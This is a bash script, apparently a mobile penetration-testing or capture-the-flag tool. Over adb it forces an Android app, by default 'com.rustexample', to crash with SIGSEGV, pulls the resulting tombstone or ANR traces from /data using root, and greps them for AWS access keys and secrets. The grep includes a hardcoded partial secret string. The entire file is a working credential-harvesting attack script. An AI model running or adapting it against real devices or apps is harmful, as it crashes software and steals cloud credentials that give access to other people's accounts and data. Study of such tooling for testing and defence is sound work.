#!/bin/bash

# Script to extract credentials from crash dumps (tombstones)

PACKAGE_NAME="${1:-com.rustexample}"
OUTPUT_DIR="./crash_dump_$(date +%Y%m%d_%H%M%S)"

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${GREEN}Crash Dump / Tombstone Extraction Script${NC}"
echo "Package: $PACKAGE_NAME"
echo "Output: $OUTPUT_DIR"
echo ""

mkdir -p "$OUTPUT_DIR"

# Check if device is connected
if ! adb devices | grep -q "device$"; then
    echo -e "${RED}Error: No device connected${NC}"
    exit 1
fi

# Get PID
PID=$(adb shell pidof "$PACKAGE_NAME" 2>/dev/null | tr -d '\r')
if [ -z "$PID" ]; then
    echo -e "${YELLOW}[!] Process not running. Starting app...${NC}"
    adb shell monkey -p "$PACKAGE_NAME" -c android.intent.category.LAUNCHER 1
    sleep 3
    PID=$(adb shell pidof "$PACKAGE_NAME" 2>/dev/null | tr -d '\r')
fi

if [ -z "$PID" ]; then
    echo -e "${RED}Error: Could not find process${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Process ID: $PID${NC}"
echo "$PID" > "${OUTPUT_DIR}/pid.txt"

# Check root access
if adb shell id 2>/dev/null | grep -q "uid=0"; then
    echo -e "${GREEN}[+] ADB is running as root${NC}"
    USE_SU=""
elif adb shell "su -c id 2>/dev/null" | grep -q "uid=0"; then
    echo -e "${GREEN}[+] Root access via su confirmed${NC}"
    USE_SU="su -c"
else
    echo -e "${YELLOW}[!] Device may not be rooted. Tombstones require root access.${NC}"
    echo -e "${YELLOW}[!] Trying anyway...${NC}"
    USE_SU=""
fi

# Check existing tombstones
echo -e "${YELLOW}[*] Checking for existing tombstones...${NC}"
if [ -n "$USE_SU" ]; then
    EXISTING_TOMBSTONES=$(adb shell "$USE_SU 'ls -t /data/tombstones/ 2>/dev/null | head -5'" 2>/dev/null | tr -d '\r')
else
    EXISTING_TOMBSTONES=$(adb shell "ls -t /data/tombstones/ 2>/dev/null | head -5" 2>/dev/null | tr -d '\r')
fi

if [ -n "$EXISTING_TOMBSTONES" ]; then
    echo -e "${GREEN}[+] Found existing tombstones:${NC}"
    echo "$EXISTING_TOMBSTONES"
    echo ""
fi

# Trigger crash
echo -e "${YELLOW}[*] Triggering crash (SIGSEGV)...${NC}"
echo -e "${YELLOW}[!] This will crash the app!${NC}"
sleep 2

if [ -n "$USE_SU" ]; then
    adb shell "$USE_SU 'kill -11 $PID'" 2>/dev/null
else
    adb shell "kill -11 $PID" 2>/dev/null
fi

sleep 3

# Check for new tombstone
echo -e "${YELLOW}[*] Checking for new tombstone...${NC}"
if [ -n "$USE_SU" ]; then
    LATEST_TOMBSTONE=$(adb shell "$USE_SU 'ls -t /data/tombstones/ 2>/dev/null | head -1'" 2>/dev/null | tr -d '\r')
else
    LATEST_TOMBSTONE=$(adb shell "ls -t /data/tombstones/ 2>/dev/null | head -1" 2>/dev/null | tr -d '\r')
fi

if [ -z "$LATEST_TOMBSTONE" ]; then
    echo -e "${RED}[-] No tombstone found. Crash may not have created dump.${NC}"
    echo -e "${YELLOW}[!] Trying alternative: Check /data/anr/ for ANR traces...${NC}"
    
    # Check ANR traces
    if [ -n "$USE_SU" ]; then
        ANR_FILES=$(adb shell "$USE_SU 'ls -t /data/anr/ 2>/dev/null | head -3'" 2>/dev/null | tr -d '\r')
    else
        ANR_FILES=$(adb shell "ls -t /data/anr/ 2>/dev/null | head -3" 2>/dev/null | tr -d '\r')
    fi
    
    if [ -n "$ANR_FILES" ]; then
        echo -e "${GREEN}[+] Found ANR traces:${NC}"
        echo "$ANR_FILES"
        for anr_file in $ANR_FILES; do
            echo -e "${YELLOW}[*] Pulling ANR trace: $anr_file${NC}"
            adb pull "/data/anr/$anr_file" "${OUTPUT_DIR}/anr_${anr_file}" 2>/dev/null || {
                if [ -n "$USE_SU" ]; then
                    adb shell "$USE_SU 'cat /data/anr/$anr_file'" > "${OUTPUT_DIR}/anr_${anr_file}" 2>/dev/null
                else
                    adb shell "cat /data/anr/$anr_file" > "${OUTPUT_DIR}/anr_${anr_file}" 2>/dev/null
                fi
            }
        done
    fi
    
    echo -e "${YELLOW}[!] No crash dump created. This method may not work on this device.${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Found tombstone: $LATEST_TOMBSTONE${NC}"

# Pull tombstone
echo -e "${YELLOW}[*] Pulling tombstone...${NC}"
if [ -n "$USE_SU" ]; then
    adb pull "/data/tombstones/$LATEST_TOMBSTONE" "${OUTPUT_DIR}/tombstone.txt" 2>/dev/null || {
        # If pull fails, try cat
        adb shell "$USE_SU 'cat /data/tombstones/$LATEST_TOMBSTONE'" > "${OUTPUT_DIR}/tombstone.txt" 2>/dev/null
    }
else
    adb pull "/data/tombstones/$LATEST_TOMBSTONE" "${OUTPUT_DIR}/tombstone.txt" 2>/dev/null || {
        adb shell "cat /data/tombstones/$LATEST_TOMBSTONE" > "${OUTPUT_DIR}/tombstone.txt" 2>/dev/null
    }
fi

if [ ! -f "${OUTPUT_DIR}/tombstone.txt" ] || [ ! -s "${OUTPUT_DIR}/tombstone.txt" ]; then
    echo -e "${RED}[-] Failed to pull tombstone${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Tombstone pulled: ${OUTPUT_DIR}/tombstone.txt${NC}"

# Extract strings and search for credentials
echo -e "${YELLOW}[*] Searching for credentials in tombstone...${NC}"

if command -v strings &> /dev/null; then
    # Extract strings from tombstone
    strings "${OUTPUT_DIR}/tombstone.txt" > "${OUTPUT_DIR}/tombstone_strings.txt" 2>/dev/null
    echo -e "${GREEN}[+] Extracted strings to ${OUTPUT_DIR}/tombstone_strings.txt${NC}"
    
    # Search for AWS access keys
    echo -e "${YELLOW}[*] Searching for AWS Access Key IDs...${NC}"
    grep -E "AKIA[0-9A-Z]{16}" "${OUTPUT_DIR}/tombstone_strings.txt" > "${OUTPUT_DIR}/tombstone_access_keys.txt" 2>/dev/null
    if [ -s "${OUTPUT_DIR}/tombstone_access_keys.txt" ]; then
        echo -e "${GREEN}[!] FOUND ACCESS KEYS in tombstone:${NC}"
        cat "${OUTPUT_DIR}/tombstone_access_keys.txt"
    else
        echo -e "${YELLOW}[!] No access keys found with pattern AKIA...${NC}"
    fi
    
    # Search for secret keys
    echo -e "${YELLOW}[*] Searching for secret keys...${NC}"
    grep -E "ckCcy10mEtAjPOo|secret|Secret" "${OUTPUT_DIR}/tombstone_strings.txt" | head -20 > "${OUTPUT_DIR}/tombstone_secrets.txt" 2>/dev/null
    
    # Search for credential keywords
    echo -e "${YELLOW}[*] Searching for credential keywords...${NC}"
    grep -iE "access_key|secret|credential|aws|s3|bucket" "${OUTPUT_DIR}/tombstone_strings.txt" > "${OUTPUT_DIR}/tombstone_credentials.txt" 2>/dev/null
    
    CRED_COUNT=$(wc -l < "${OUTPUT_DIR}/tombstone_credentials.txt" 2>/dev/null || echo "0")
    echo -e "${GREEN}[+] Found $CRED_COUNT lines with credential keywords${NC}"
else
    echo -e "${YELLOW}[!] 'strings' command not found. Searching directly in tombstone...${NC}"
    grep -E "AKIA[0-9A-Z]{16}" "${OUTPUT_DIR}/tombstone.txt" > "${OUTPUT_DIR}/tombstone_access_keys.txt" 2>/dev/null
    grep -iE "access_key|secret|credential" "${OUTPUT_DIR}/tombstone.txt" > "${OUTPUT_DIR}/tombstone_credentials.txt" 2>/dev/null
fi

echo ""
echo -e "${GREEN}=== Summary ===${NC}"
echo "Output directory: $OUTPUT_DIR"
echo "Files created:"
ls -lh "$OUTPUT_DIR" | tail -n +2

if [ -s "${OUTPUT_DIR}/tombstone_access_keys.txt" ]; then
    echo ""
    echo -e "${GREEN}[!] CREDENTIALS FOUND in crash dump!${NC}"
else
    echo ""
    echo -e "${YELLOW}[!] No credentials found in crash dump.${NC}"
    echo -e "${YELLOW}[!] This could mean:${NC}"
    echo "   - Credentials not in crash dump (may be in heap, not stack)"
    echo "   - Crash dump doesn't contain full memory"
    echo "   - Credentials were cleared before crash"
fi
